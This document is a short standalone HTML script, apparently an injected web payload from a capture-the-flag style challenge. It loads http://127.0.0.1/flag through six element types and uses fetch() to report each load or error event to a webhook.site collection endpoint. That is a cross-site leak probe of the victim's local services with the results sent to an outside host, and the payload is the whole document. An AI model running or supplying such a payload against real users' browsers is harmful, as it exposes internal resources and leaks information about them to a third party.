<script>
function probe(tag, attr) {
  const el = document.createElement(tag);

  el.onload = () => {
    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?tag=" + tag + "&event=load");
  };
  el.onerror = () => {
    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?tag=" + tag + "&event=error");
  };

  el[attr] = "http://127.0.0.1/flag?cb=" + Math.random();
  document.body.appendChild(el);
}

probe("img", "src");
probe("script", "src");
probe("link", "href");
probe("iframe", "src");
probe("video", "src");
probe("audio", "src");
</script>
